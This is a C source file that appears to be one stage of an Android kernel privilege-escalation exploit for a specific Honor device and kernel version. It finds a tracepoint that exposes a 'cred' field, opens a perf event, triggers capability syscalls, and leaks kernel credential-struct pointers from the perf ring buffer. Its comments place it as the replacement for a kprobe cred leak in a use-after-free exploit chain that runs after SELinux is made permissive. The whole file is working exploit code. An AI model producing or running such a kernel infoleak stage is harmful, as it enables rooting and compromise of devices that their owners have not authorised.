/*
 * cred_probe_61258.c — no-kprobe credential discovery helper for the merged
 * 98260/64560 prototype on Honor MLY-AN00 / 6.12.58.
 *
 * Idea borrowed from the 64560 ecosystem (HOneClick perf_cred_honor.c,
 * MagicRoot cred_target): after SELinux is permissive, open a perf tracepoint
 * that carries a `cred` pointer in its raw payload, trigger capability checks,
 * and read the cred pointer from the perf ring.  This is the perf-based
 * replacement for the 98260 port's __set_task_comm kprobe cred leak.
 *
 * The event/field layout is discovered at runtime from tracefs:
 *   /sys/kernel/tracing/events/<sys>/<event>/{id,format}
 * so the helper is not hard-coded to HOneClick's CAP_TRACEPOINT_ID=681.
 *
 * Output contract:
 *   EVENT=<sys/event> ID=<id> CRED_OFF=<offset>
 *   SAMPLE cred=0x...
 *   CRED_PROBE_OK cred=0x... bit16=0|1
 *   CRED_PROBE_FAIL reason=...
 *
 * Safety: read-only w.r.t. kernel state (perf ring + capability syscalls only);
 * does not perform the UAF or any arbitrary write.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/perf_event.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define TRACE_ROOT "/sys/kernel/tracing"
#define PERF_PAGES 8

static int read_file(const char *path, char *buf, size_t cap)
{
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	ssize_t n;
	if (fd < 0) return -1;
	n = read(fd, buf, cap - 1);
	close(fd);
	if (n <= 0) return -1;
	buf[n] = 0;
	/* trim trailing whitespace/newlines */
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r' ||
			 buf[n - 1] == ' ' || buf[n - 1] == '\t'))
		buf[--n] = 0;
	return 0;
}

static int parse_cred_offset(const char *format_path, int *cred_off,
			     int *cred_size)
{
	char line[512];
	FILE *f = fopen(format_path, "re");
	if (!f) return -1;
	*cred_off = -1;
	*cred_size = 8;
	while (fgets(line, sizeof line, f)) {
		char type[256];
		int off, size, sign;
		char *semi, *name, *sp;
		if (sscanf(line, "field:%255[^;]; offset:%d; size:%d; signed:%d;",
			   type, &off, &size, &sign) != 4)
			continue;
		semi = strchr(type, ';');
		if (semi) *semi = 0;
		/* field name is the last identifier in the type string */
		sp = strrchr(type, ' ');
		name = sp ? sp + 1 : type;
		if (!strcmp(name, "cred") && size >= 4) {
			*cred_off = off;
			*cred_size = size;
			fclose(f);
			return 0;
		}
	}
	fclose(f);
	return -1;
}

/* Find a tracepoint whose format has a `cred` field. Prefer cap events. */
static int find_cred_tracepoint(char *event_name, size_t name_cap,
				int *event_id, int *cred_off, int *cred_size)
{
	DIR *sysdir = opendir(TRACE_ROOT "/events");
	struct dirent *sysent;
	if (!sysdir) return -1;
	while ((sysent = readdir(sysdir))) {
		DIR *evdir;
		struct dirent *event;
		char base[512];
		if (sysent->d_name[0] == '.') continue;
		snprintf(base, sizeof base, "%s/events/%s", TRACE_ROOT,
			 sysent->d_name);
		evdir = opendir(base);
		if (!evdir) continue;
		while ((event = readdir(evdir))) {
			char path[768], idbuf[64], fmt[512];
			int id = -1, off = -1, size = 8;
			if (event->d_name[0] == '.') continue;
			snprintf(path, sizeof path, "%s/%s/id", base, event->d_name);
			if (read_file(path, idbuf, sizeof idbuf) ||
			    sscanf(idbuf, "%d", &id) != 1)
				continue;
			snprintf(fmt, sizeof fmt, "%s/%s/format", base, event->d_name);
			if (parse_cred_offset(fmt, &off, &size))
				continue;
			/* prefer cap subsystem/event; remember first fallback */
			if (strstr(sysent->d_name, "cap") ||
			    strstr(event->d_name, "cap")) {
				snprintf(event_name, name_cap, "%s/%s",
					 sysent->d_name, event->d_name);
				*event_id = id;
				*cred_off = off;
				*cred_size = size;
				closedir(evdir);
				closedir(sysdir);
				return 0;
			}
		}
		closedir(evdir);
	}
	closedir(sysdir);
	return -1;
}

static int parse_sample(const unsigned char *sample, size_t len, int event_id,
			int cred_off, int cred_size, uint64_t *cred_out)
{
	const struct perf_event_header *h = (const struct perf_event_header *)sample;
	const unsigned char *p = sample + sizeof(*h);
	const unsigned char *end = sample + h->size;
	uint32_t raw_size;
	uint16_t common_type;
	uint64_t cred = 0;
	int copy;

	if (h->size < sizeof(*h) || h->size > len ||
	    h->type != PERF_RECORD_SAMPLE)
		return -1;
	/* sample_type: TID(pid,tid) | TIME | RAW */
	if (p + 8 + 8 + 4 > end) return -1;
	p += 8; /* pid/tid */
	p += 8; /* time */
	memcpy(&raw_size, p, 4);
	p += 4;
	if (p + raw_size > end || raw_size < (size_t)(cred_off + 8))
		return -1;
	memcpy(&common_type, p, 2);
	if ((int)common_type != event_id)
		return -1;
	copy = cred_size < 8 ? cred_size : 8;
	memcpy(&cred, p + cred_off, (size_t)copy);
	if (cred < 0xffffff8000000000ULL)
		return -1;
	*cred_out = cred;
	return 0;
}

int main(void)
{
	char event[256] = {0};
	char path[768], idbuf[64];
	int event_id = -1, cred_off = -1, cred_size = 8;
	struct perf_event_attr attr;
	struct perf_event_mmap_page *meta;
	size_t page, map_size;
	unsigned char *data;
	uint64_t data_size;
	int fd, last_cred = 0;
	uint64_t cred = 0;
	long page_size = sysconf(_SC_PAGESIZE);

	setvbuf(stdout, NULL, _IOLBF, 0);
	if (find_cred_tracepoint(event, sizeof event, &event_id, &cred_off,
				 &cred_size)) {
		printf("CRED_PROBE_FAIL reason=no_cred_tracepoint\n");
		return 1;
	}
	printf("EVENT=%s ID=%d CRED_OFF=%d\n", event, event_id, cred_off);

	snprintf(path, sizeof path, "%s/events/%s/id", TRACE_ROOT, event);
	if (read_file(path, idbuf, sizeof idbuf) == 0) {
		int id2 = atoi(idbuf);
		if (id2 > 0) event_id = id2;
	}

	memset(&attr, 0, sizeof attr);
	attr.type = PERF_TYPE_TRACEPOINT;
	attr.size = sizeof attr;
	attr.config = (uint64_t)event_id;
	attr.sample_period = 1;
	attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_TIME | PERF_SAMPLE_RAW;
	attr.wakeup_events = 1;
	attr.disabled = 1;
	fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
	if (fd < 0) {
		printf("CRED_PROBE_FAIL reason=perf_event_open errno=%d(%s)\n",
		       errno, strerror(errno));
		return 1;
	}
	page = (size_t)(page_size > 0 ? page_size : 4096);
	map_size = (size_t)(PERF_PAGES + 1) * page;
	meta = mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (meta == MAP_FAILED) {
		printf("CRED_PROBE_FAIL reason=mmap errno=%d(%s)\n", errno,
		       strerror(errno));
		close(fd);
		return 1;
	}
	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

	for (int i = 0; i < 64; i++) {
		(void)setresgid(0, 0, 0);
		(void)setresuid(0, 0, 0);
		(void)setgroups(0, NULL);
		(void)unshare(CLONE_NEWNS);
		(void)syscall(SYS_keyctl, 0, 0, 1, 0, 0);
		sched_yield();
	}
	usleep(100000);
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
	__sync_synchronize();

	uint64_t head = meta->data_head;
	uint64_t tail = meta->data_tail;
	size_t data_offset = meta->data_offset ? meta->data_offset : page;
	data_size = meta->data_size ? meta->data_size : (uint64_t)PERF_PAGES * page;
	data = (unsigned char *)meta + data_offset;
	while (tail < head) {
		size_t off = (size_t)(tail % data_size);
		struct perf_event_header h;
		if (data_size < sizeof h || off + sizeof h > data_size) break;
		memcpy(&h, data + off, sizeof h);
		if (h.size < sizeof h || h.size > data_size - off) break;
		uint64_t candidate = 0;
		if (!parse_sample(data + off, h.size, event_id, cred_off,
				  cred_size, &candidate)) {
			printf("SAMPLE cred=%#llx\n", (unsigned long long)candidate);
			cred = candidate;
			last_cred = 1;
		}
		tail += h.size;
	}
	meta->data_tail = tail;
	munmap(meta, map_size);
	close(fd);
	if (!last_cred || !cred) {
		printf("CRED_PROBE_FAIL reason=no_sample\n");
		return 1;
	}
	printf("CRED_PROBE_OK cred=%#llx bit16=%d\n", (unsigned long long)cred,
	       (int)(((cred + 0x40) >> 16) & 1));
	return 0;
}
